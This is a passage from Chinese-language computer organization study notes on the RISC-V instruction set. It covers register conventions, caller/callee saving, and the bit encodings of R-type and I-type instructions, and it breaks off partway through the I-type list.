<p><strong>Von Neumann’ Computer</strong></p>
<p>如今的计算机是基于两个核心原理构建的：存储程序概念。
这两个原理分别是：</p>
<ul>
<li>指令被表示为数字；</li>
<li>程序可以像数字一样存储在内存中，以便读取或写入。</li>
</ul>
<p>四个设计理念：</p>
<ol>
<li>Simplicity favors regularity 指令集的设计应该尽可能简单，规则。</li>
<li>Smaller is faster 尽可能减少指令集的大小，以便提高速度。</li>
<li>Good design demands good compromises 设计指令集时，需要权衡各种因素。</li>
<li>Make the common case fast 优化常见情况的执行速度。</li>
</ol>
<p>当设计ISA时，需要**硬件简单--让芯片只实现基本的原语并能快速运行**，<strong>指令要规整</strong></p>
<h2 id="note-co-wk3-instruction-characteristics">Instruction characteristics<a class="headerlink" href="#note-co-wk3-instruction-characteristics" title="Permanent link">&para;</a></h2>
<p>指令集的基本结构</p>
<p>operator+operands</p>
<div align=center><img src="../NOTE/CO/pc/17.png" width="60%"></div>

<div class="admonition note">
<p class="admonition-title">Note</p>
<p>不同的操作系统，字的长度不同，比如32位系统，字长为32位(4 Byte)，64位系统，字长为64位(8 Byte)。</p>
</div>
<p>边界对齐送地址，最后两位是00</p>
<h2 id="note-co-wk3-risc-v">RISC-V 指令集<a class="headerlink" href="#note-co-wk3-risc-v" title="Permanent link">&para;</a></h2>
<table>
<thead>
<tr>
<th style="text-align: center;">寄存器</th>
<th style="text-align: center;">ABI 名称</th>
<th style="text-align: left;">用途描述</th>
<th style="text-align: center;">saver</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center;">x0</td>
<td style="text-align: center;">zero</td>
<td style="text-align: left;">硬件 0</td>
<td style="text-align: center;"></td>
</tr>
<tr>
<td style="text-align: center;">x1</td>
<td style="text-align: center;">ra</td>
<td style="text-align: left;">返回地址（return address）</td>
<td style="text-align: center;">caller</td>
</tr>
<tr>
<td style="text-align: center;">x2</td>
<td style="text-align: center;">sp</td>
<td style="text-align: left;">栈指针（stack pointer）</td>
<td style="text-align: center;">callee</td>
</tr>
<tr>
<td style="text-align: center;">x3</td>
<td style="text-align: center;">gp</td>
<td style="text-align: left;">全局指针（global pointer）</td>
<td style="text-align: center;"></td>
</tr>
<tr>
<td style="text-align: center;">x4</td>
<td style="text-align: center;">tp</td>
<td style="text-align: left;">线程指针（thread pointer）</td>
<td style="text-align: center;"></td>
</tr>
<tr>
<td style="text-align: center;">x5</td>
<td style="text-align: center;">t0</td>
<td style="text-align: left;">临时变量/备用链接寄存器（alternate link reg）</td>
<td style="text-align: center;">caller</td>
</tr>
<tr>
<td style="text-align: center;">x6-7</td>
<td style="text-align: center;">t1-2</td>
<td style="text-align: left;">临时变量</td>
<td style="text-align: center;">caller</td>
</tr>
<tr>
<td style="text-align: center;">x8</td>
<td style="text-align: center;">s0/fp</td>
<td style="text-align: left;">需要保存的寄存器/帧指针（frame pointer）</td>
<td style="text-align: center;">callee</td>
</tr>
<tr>
<td style="text-align: center;">x9</td>
<td style="text-align: center;">s1</td>
<td style="text-align: left;">需要保存的寄存器</td>
<td style="text-align: center;">callee</td>
</tr>
<tr>
<td style="text-align: center;">x10-11</td>
<td style="text-align: center;">a0-1</td>
<td style="text-align: left;">函数参数/返回值</td>
<td style="text-align: center;">caller</td>
</tr>
<tr>
<td style="text-align: center;">x12-17</td>
<td style="text-align: center;">a2-7</td>
<td style="text-align: left;">函数参数</td>
<td style="text-align: center;">caller</td>
</tr>
<tr>
<td style="text-align: center;">x18-27</td>
<td style="text-align: center;">s2-11</td>
<td style="text-align: left;">需要保存的寄存器</td>
<td style="text-align: center;">callee</td>
</tr>
<tr>
<td style="text-align: center;">x28-31</td>
<td style="text-align: center;">t3-6</td>
<td style="text-align: left;">临时变量</td>
<td style="text-align: center;">caller</td>
</tr>
</tbody>
</table>
<div class="admonition note">
<p class="admonition-title">saver</p>
<p>在riscv代码中,当进行函数调用时,需要考虑caller save和callee save;</p>
<p>所谓caller save,就是指在函数调用时,调用者需要保存自己的寄存器,一般是参数还有返回值;</p>
<p>所谓callee save,就是指在函数调用时,被调用者需要保存某些重要寄存器里面的值,比如<code>x8-11</code>这些寄存器;</p>
<p>caller需要保证调用子函数时,x1,x5,x6-7,a0-7寄存器可以被子函数使用;</p>
<p>callee需要保证调用结束后,x8-11寄存器里面的值不会改变;</p>
<p>保存的方法是使用堆栈</p>
<p><div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-co-wk3-__codelineno-0-1"></a>addi sp, sp, -8
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-co-wk3-__codelineno-0-2"></a>sw x1, 4(sp)
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-co-wk3-__codelineno-0-3"></a>sw x2, 0(sp) #push
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-co-wk3-__codelineno-0-4"></a>...
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-co-wk3-__codelineno-0-5"></a>...
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-co-wk3-__codelineno-0-6"></a>lw x2, 0(sp)
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-co-wk3-__codelineno-0-7"></a>lw x1, 4(sp) #pop
</span></code></pre></div>
<figure markdown="span">
<img alt="Image title" src="../NOTE/CO/pc/push.png" width="400" />
<figcaption>示意图</figcaption>
</figure></p>
<p><code>sp</code>始终指向栈顶</p>
</div>
<div class="admonition section">
<p class="admonition-title">RISC-V 指令集的类型</p>
<div class="tabbed-set tabbed-alternate" data-tabs="1:6"><input checked="checked" id="note-co-wk3-risc-v-r-type" name="note-co-wk3-__tabbed_1" type="radio" /><input id="note-co-wk3-risc-v-i-type" name="note-co-wk3-__tabbed_1" type="radio" /><input id="note-co-wk3-risc-v-s-type" name="note-co-wk3-__tabbed_1" type="radio" /><input id="note-co-wk3-risc-v-b-type" name="note-co-wk3-__tabbed_1" type="radio" /><input id="note-co-wk3-risc-v-u-type" name="note-co-wk3-__tabbed_1" type="radio" /><input id="note-co-wk3-risc-v-j-type" name="note-co-wk3-__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="note-co-wk3-risc-v-r-type">R-type</label><label for="note-co-wk3-risc-v-i-type">I-type</label><label for="note-co-wk3-risc-v-s-type">S-type</label><label for="note-co-wk3-risc-v-b-type">B-type</label><label for="note-co-wk3-risc-v-u-type">U-type</label><label for="note-co-wk3-risc-v-j-type">J-type</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p>R-type指令是指令集中的一种类型，它们的操作码字段是固定的，而剩余的字段则根据指令的具体功能而变化。R-type指令通常用于执行算术运算和逻辑运算等操作;R-type指令的格式如下所示：
<table class="riscv-table">
<tr>
     <td class="riscv-table-numnodel">31</td>
     <td class="riscv-table-numnode" colspan="5"></td>
     <td class="riscv-table-numnoder">25</td>
     <td class="riscv-table-numnodel">24</td>
     <td class="riscv-table-numnode" colspan="3"></td>
     <td class="riscv-table-numnoder">20</td>
     <td class="riscv-table-numnodel">19</td>
     <td class="riscv-table-numnode" colspan="3"></td>
     <td class="riscv-table-numnoder">15</td>
     <td class="riscv-table-numnodel">14</td>
     <td class="riscv-table-numnode" colspan="1"></td>
     <td class="riscv-table-numnoder">12</td>
     <td class="riscv-table-numnodel">11</td>
     <td class="riscv-table-numnode" colspan="3"></td>
     <td class="riscv-table-numnoder">7</td>
     <td class="riscv-table-numnodel">6</td>
     <td class="riscv-table-numnode" colspan="5"></td>
     <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
     <td colspan="7" class="riscv-table-node">funct7</td>
     <td colspan="5" class="riscv-table-node">rs2</td>
     <td colspan="5" class="riscv-table-node">rs1</td>
     <td colspan="3" class="riscv-table-node">funct3</td>
     <td colspan="5" class="riscv-table-node">rd</td>
     <td colspan="7" class="riscv-table-node">opcode</td>
</tr>
</table></p>
<p><code>rd = rs1 op rs2</code>,有时候<code>rs1</code>,<code>rs2</code>,又称为<code>rs</code>,<code>rt</code></p>
<details class="abstract">
<summary>R-type指令</summary>
<table>
<thead>
<tr>
<th>Instruction</th>
<th>Name</th>
<th>Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td>ADD</td>
<td>Addition</td>
<td>Adds two values and stores the result in the destination register.</td>
</tr>
<tr>
<td>SUB</td>
<td>Subtraction</td>
<td>Subtracts the second value from the first and stores the result in the destination register.</td>
</tr>
<tr>
<td>SLT</td>
<td>Set Less Than</td>
<td>Sets the destination register to 1 if the first value is less than the second (signed), otherwise sets to 0.</td>
</tr>
<tr>
<td>SLTU</td>
<td>Set Less Than Unsigned</td>
<td>Sets the destination register to 1 if the first value is less than the second (unsigned), otherwise sets to 0.</td>
</tr>
<tr>
<td>AND</td>
<td>Logical AND</td>
<td>Performs a bitwise AND operation between two values and stores the result in the destination register.</td>
</tr>
<tr>
<td>OR</td>
<td>Logical OR</td>
<td>Performs a bitwise OR operation between two values and stores the result in the destination register.</td>
</tr>
<tr>
<td>XOR</td>
<td>Logical XOR</td>
<td>Performs a bitwise XOR (exclusive OR) operation between two values and stores the result.</td>
</tr>
<tr>
<td>SLL</td>
<td>Shift Left Logical</td>
<td>Shifts the bits of the first value to the left by the number of positions specified by the second value, filling with zeros.</td>
</tr>
<tr>
<td>SRL</td>
<td>Shift Right Logical</td>
<td>Shifts the bits of the first value to the right by the number of positions specified, filling with zeros.</td>
</tr>
<tr>
<td>SRA</td>
<td>Shift Right Arithmetic</td>
<td>Shifts the bits of the first value to the right by the number of positions specified, maintaining the sign bit.</td>
</tr>
</tbody>
</table>
</details>
<div class="admonition info">
<p class="admonition-title">常见的R-type指令</p>
<div class="tabbed-set tabbed-alternate" data-tabs="2:10"><input checked="checked" id="note-co-wk3-risc-v-add" name="note-co-wk3-__tabbed_2" type="radio" /><input id="note-co-wk3-risc-v-sub" name="note-co-wk3-__tabbed_2" type="radio" /><input id="note-co-wk3-risc-v-slt" name="note-co-wk3-__tabbed_2" type="radio" /><input id="note-co-wk3-risc-v-sltu" name="note-co-wk3-__tabbed_2" type="radio" /><input id="note-co-wk3-risc-v-and" name="note-co-wk3-__tabbed_2" type="radio" /><input id="note-co-wk3-risc-v-or" name="note-co-wk3-__tabbed_2" type="radio" /><input id="note-co-wk3-risc-v-xor" name="note-co-wk3-__tabbed_2" type="radio" /><input id="note-co-wk3-risc-v-sll" name="note-co-wk3-__tabbed_2" type="radio" /><input id="note-co-wk3-risc-v-srl" name="note-co-wk3-__tabbed_2" type="radio" /><input id="note-co-wk3-risc-v-sra" name="note-co-wk3-__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="note-co-wk3-risc-v-add">ADD</label><label for="note-co-wk3-risc-v-sub">SUB</label><label for="note-co-wk3-risc-v-slt">SLT</label><label for="note-co-wk3-risc-v-sltu">SLTU</label><label for="note-co-wk3-risc-v-and">AND</label><label for="note-co-wk3-risc-v-or">OR</label><label for="note-co-wk3-risc-v-xor">XOR</label><label for="note-co-wk3-risc-v-sll">SLL</label><label for="note-co-wk3-risc-v-srl">SRL</label><label for="note-co-wk3-risc-v-sra">SRA</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p><table class="riscv-table">
  <tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">25</td>
      <td class="riscv-table-numnodel">24</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="7" class="riscv-table-node-little">0000000</td>
      <td colspan="5" class="riscv-table-node-little">rs2</td>
      <td colspan="5" class="riscv-table-node-little">rs1</td>
      <td colspan="3" class="riscv-table-node-little">000</td>
      <td colspan="5" class="riscv-table-node-little">rd</td>
      <td colspan="7" class="riscv-table-node-little">0110011</td>
  </tr>
  </table></p>
<ul>
<li>使用格式 <code>ADD rd,rs1,rs2</code>  <code>rd = rs1 + rs2</code></li>
<li>溢出将会被忽略</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
  <tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">25</td>
      <td class="riscv-table-numnodel">24</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="7" class="riscv-table-node-little">0100000</td>
      <td colspan="5" class="riscv-table-node-little">rs2</td>
      <td colspan="5" class="riscv-table-node-little">rs1</td>
      <td colspan="3" class="riscv-table-node-little">000</td>
      <td colspan="5" class="riscv-table-node-little">rd</td>
      <td colspan="7" class="riscv-table-node-little">0110011</td>
  </tr>
</table></p>
<ul>
<li>使用格式 <code>SUB rd,rs1,rs2</code>  <code>rd = rs1 - rs2</code></li>
<li>溢出将会被忽略</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
  <tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">25</td>
      <td class="riscv-table-numnodel">24</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="7" class="riscv-table-node-little">0000000</td>
      <td colspan="5" class="riscv-table-node-little">rs2</td>
      <td colspan="5" class="riscv-table-node-little">rs1</td>
      <td colspan="3" class="riscv-table-node-little">010</td>
      <td colspan="5" class="riscv-table-node-little">rd</td>
      <td colspan="7" class="riscv-table-node-little">0110011</td>
  </tr>
  </table></p>
<ul>
<li>使用格式 <code>SLT rd,rs1,rs2</code>  <code>rd = ($signed(rs1) &lt; $signed(rs2)) ? 1 : 0</code></li>
<li>有符号数的比较</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
<tr>
    <td class="riscv-table-numnodel">31</td>
    <td class="riscv-table-numnode" colspan="5"></td>
    <td class="riscv-table-numnoder">25</td>
    <td class="riscv-table-numnodel">24</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">20</td>
    <td class="riscv-table-numnodel">19</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">15</td>
    <td class="riscv-table-numnodel">14</td>
    <td class="riscv-table-numnode" colspan="1"></td>
    <td class="riscv-table-numnoder">12</td>
    <td class="riscv-table-numnodel">11</td>
    <td class="riscv-table-numnode" colspan="3"></td>
    <td class="riscv-table-numnoder">7</td>
    <td class="riscv-table-numnodel">6</td>
    <td class="riscv-table-numnode" colspan="5"></td>
    <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
    <td colspan="7" class="riscv-table-node-little">0000000</td>
    <td colspan="5" class="riscv-table-node-little">rs2</td>
    <td colspan="5" class="riscv-table-node-little">rs1</td>
    <td colspan="3" class="riscv-table-node-little">011</td>
    <td colspan="5" class="riscv-table-node-little">rd</td>
    <td colspan="7" class="riscv-table-node-little">0110011</td>
</tr>
</table></p>
<ul>
<li>使用格式 <code>SLTU rd,rs1,rs2</code>  <code>rd = (rs1 &lt; rs2) ? 1 : 0</code></li>
<li>进行无符号数的比较</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
  <tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">25</td>
      <td class="riscv-table-numnodel">24</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="7" class="riscv-table-node-little">0000000</td>
      <td colspan="5" class="riscv-table-node-little">rs2</td>
      <td colspan="5" class="riscv-table-node-little">rs1</td>
      <td colspan="3" class="riscv-table-node-little">111</td>
      <td colspan="5" class="riscv-table-node-little">rd</td>
      <td colspan="7" class="riscv-table-node-little">0110011</td>
  </tr>
  </table> </p>
<ul>
<li>使用格式 <code>AND rd,rs1,rs2</code>  <code>rd = rs1 &amp; rs2</code></li>
<li>按位的与操作</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
  <tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">25</td>
      <td class="riscv-table-numnodel">24</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="7" class="riscv-table-node-little">0000000</td>
      <td colspan="5" class="riscv-table-node-little">rs2</td>
      <td colspan="5" class="riscv-table-node-little">rs1</td>
      <td colspan="3" class="riscv-table-node-little">110</td>
      <td colspan="5" class="riscv-table-node-little">rd</td>
      <td colspan="7" class="riscv-table-node-little">0110011</td>
  </tr>
  </table></p>
<ul>
<li>使用格式 <code>OR rd,rs1,rs2</code>  <code>rd = rs1 | rs2</code></li>
<li>执行按位或操作</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
  <tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">25</td>
      <td class="riscv-table-numnodel">24</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="7" class="riscv-table-node-little">0000000</td>
      <td colspan="5" class="riscv-table-node-little">rs2</td>
      <td colspan="5" class="riscv-table-node-little">rs1</td>
      <td colspan="3" class="riscv-table-node-little">100</td>
      <td colspan="5" class="riscv-table-node-little">rd</td>
      <td colspan="7" class="riscv-table-node-little">0110011</td>
  </tr>
  </table></p>
<ul>
<li>使用格式 <code>XOR rd,rs1,rs2</code>  <code>rd = rs1 ^ rs2</code></li>
<li>执行按位异或操作</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
  <tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">25</td>
      <td class="riscv-table-numnodel">24</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="7" class="riscv-table-node-little">0000000</td>
      <td colspan="5" class="riscv-table-node-little">rs2</td>
      <td colspan="5" class="riscv-table-node-little">rs1</td>
      <td colspan="3" class="riscv-table-node-little">001</td>
      <td colspan="5" class="riscv-table-node-little">rd</td>
      <td colspan="7" class="riscv-table-node-little">0110011</td>
  </tr>
</table></p>
<ul>
<li>使用格式 <code>SLL rd,rs1,rs2</code>  <code>rd = rs1 &lt;&lt; rs2[4:0]</code></li>
<li>逻辑左移</li>
<li>取<code>rs2</code>的低五位进行运算</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
  <tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">25</td>
      <td class="riscv-table-numnodel">24</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="7" class="riscv-table-node-little">0000000</td>
      <td colspan="5" class="riscv-table-node-little">rs2</td>
      <td colspan="5" class="riscv-table-node-little">rs1</td>
      <td colspan="3" class="riscv-table-node-little">101</td>
      <td colspan="5" class="riscv-table-node-little">rd</td>
      <td colspan="7" class="riscv-table-node-little">0110011</td>
  </tr>
  </table></p>
<ul>
<li>指令格式: <code>srl rd,rs1,rs2</code>,<code>rd=rs1&gt;&gt;rs2[4:0]</code></li>
<li>取 <code>rs2</code> 的低5位</li>
</ul>
</div>
<div class="tabbed-block">
<p><table class="riscv-table" style="margin-bottom: 0.6em">
  <tr>
      <td class="riscv-table-numnodel">31</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">25</td>
      <td class="riscv-table-numnodel">24</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">20</td>
      <td class="riscv-table-numnodel">19</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">15</td>
      <td class="riscv-table-numnodel">14</td>
      <td class="riscv-table-numnode" colspan="1"></td>
      <td class="riscv-table-numnoder">12</td>
      <td class="riscv-table-numnodel">11</td>
      <td class="riscv-table-numnode" colspan="3"></td>
      <td class="riscv-table-numnoder">7</td>
      <td class="riscv-table-numnodel">6</td>
      <td class="riscv-table-numnode" colspan="5"></td>
      <td class="riscv-table-numnoder">0</td>
  </tr>
  <tr>
      <td colspan="7" class="riscv-table-node-little">0100000</td>
      <td colspan="5" class="riscv-table-node-little">rs2</td>
      <td colspan="5" class="riscv-table-node-little">rs1</td>
      <td colspan="3" class="riscv-table-node-little">101</td>
      <td colspan="5" class="riscv-table-node-little">rd</td>
      <td colspan="7" class="riscv-table-node-little">0110011</td>
  </tr>
  </table> </p>
<ul>
<li>指令格式<code>sra rd,rs1,rs2</code>;<code>rd = $signed(rs1) &gt;&gt;&gt; rs2[4:0]</code></li>
<li>算数右移，高位补符号位(为什么没有算数左移,因为没意义) </li>
</ul>
</div>
</div>
</div>
</div>
</div>
<div class="tabbed-block">
<p>使用寄存器和立即数进行数字逻辑运算，以及 load 类指令等的指令格式如下：
<table class="riscv-table">
<tr>
     <td class="riscv-table-numnodel">31</td>
     <td class="riscv-table-numnode" colspan="10"></td>
     <td class="riscv-table-numnoder">20</td>
     <td class="riscv-table-numnodel">19</td>
     <td class="riscv-table-numnode" colspan="3"></td>
     <td class="riscv-table-numnoder">15</td>
     <td class="riscv-table-numnodel">14</td>
     <td class="riscv-table-numnode" colspan="1"></td>
     <td class="riscv-table-numnoder">12</td>
     <td class="riscv-table-numnodel">11</td>
     <td class="riscv-table-numnode" colspan="3"></td>
     <td class="riscv-table-numnoder">7</td>
     <td class="riscv-table-numnodel">6</td>
     <td class="riscv-table-numnode" colspan="5"></td>
     <td class="riscv-table-numnoder">0</td>
</tr>
<tr>
     <td colspan="12" class="riscv-table-node">imm[11:0]</td>
     <td colspan="5" class="riscv-table-node">rs1</td>
     <td colspan="3" class="riscv-table-node">funct3</td>
     <td colspan="5" class="riscv-table-node">rd</td>
     <td colspan="7" class="riscv-table-node">opcode</td>
</tr>
</table> </p>
<p>立即数为 
<div class="language-Verilog highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-co-wk3-__codelineno-1-1"></a><span class="w"> </span><span class="n">imm</span><span class="o">=</span><span class="p">{{</span><span class="mh">20</span><span class="p">{</span><span class="n">inst</span><span class="p">[</span><span class="mh">31</span><span class="p">]}},</span><span class="w"> </span><span class="n">inst</span><span class="p">[</span><span class="mh">31</span><span class="o">:</span><span class="mh">20</span><span class="p">]}</span>
</span></code></pre></div>
即将立即数的最高位符号位进行扩展到32位</p>
<div class="admonition info">
<p class="admonition-title">常见的I-type指令</p>
<div class="tabbed-set tabbed-alternate" data-tabs="3:17"><input checked="checked" id="note-co-wk3-risc-v-addi" name="note-co-wk3-__tabbed_3" type="radio" /><input id="note-co-wk3-risc-v-slti" name="note-co-wk3-__tabbed_3" type="radio" /><input id="note-co-wk3-risc-v-sltiu" name="note-co-wk3-__tabbed_3" type="radio" /><input id="note-co-wk3-risc-v-andi" name="note-co-wk3-__tabbed_3" type="radio" /><input id="note-co-wk3-risc-v-ori" name="note-co-wk3-__tabbed_3" type="radio" /><input id="note-co-wk3-risc-v-xori" name="note-co-wk3-__tabbed_3" type="radio" /><input id="note-co-wk3-risc-v-slli" name="note-co-wk3-__tabbed_3" type="radio" /><input id="note-co-wk3-risc-v-srli" name="note-co-wk3-__tabbed_3" type="radio" /><input id="note-co-wk3-risc-v-srai" name="note-co-wk3-__tabbed_3" type="radio" /><input id="note-co-wk3-risc-v-jalr" name="note-co-wk3-__tabbed_3" type="radio" /><input id="note-co-wk3-risc-v-lb" name="note-co-wk3-__tabbed_3" type="radio" /><input id="note-co-wk3-risc-v-lh" name="note-co-wk3-__tabbed_3" type="radio" /><input id="note-co-wk3-risc-v-lw" name="note-co-wk3-__tabbed_3" type="radio" /><input id="note-co-wk3-risc-v-lbu" name="note-co-wk3-__tabbed_3" type="radio" /><input id="note-co-wk3-risc-v-lhu" name="note-co-wk3-__tabbed_3" type="radio" /><input id="note-co-wk3-risc-v-ecall" name="note-co-wk3-__tabbed_3" type="radio" /><input id="note-co-wk3-risc-v-ebreak" name="note-co-wk3-__tabbed_3" type="radio" /><div class="tabbed-labels"><label for="note-co-wk3-risc-v-addi">ADDI</label><label for="note-co-wk3-risc-v-slti">SLTI</label><label for="note-co-wk3-risc-v-sltiu">SLTIU</label><label for="note-co-wk3-risc-v-andi">ANDI</label><label for="note-co-wk3-risc-v-ori">ORI</label><label for="note-co-wk3-risc-v-xori">XORI</label><label for="note-co-wk3-risc-v-slli">SLLI</label><label for="note-co-wk3-risc-v-srli">SRLI</label><label for="note-co-wk3-risc-v-srai">SRAI</label><label for="note-co-wk3-risc-v-jalr">JALR</label><label for="note-co-wk3-risc-v-lb">LB</label><label for="note-co-wk3-risc-v-lh">lh</label><label for="note-co-wk3-risc-v-lw">LW</label><label 